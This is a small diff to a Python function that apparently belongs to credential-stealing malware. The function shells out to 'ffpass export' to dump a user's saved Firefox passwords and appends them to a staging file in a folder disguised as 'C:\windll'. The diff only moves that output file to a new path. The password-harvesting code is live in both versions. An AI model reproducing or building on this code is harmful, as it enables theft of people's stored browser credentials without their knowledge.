@@ -24,7 +24,7 @@ def Firefox():
         subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
         subprocess_return = subprocesss.stdout.read()
         passwords = str(subprocess_return)
-        with open(r'C:\windll\Firefox\f1.txt', "a", encoding="utf-8") as file:
+        with open(r'C:\windll\Browsers\Firefox\fox.txt', "a", encoding="utf-8") as file:
             file.write(passwords.replace('\\r', '\n'))
             file.close()
     except:
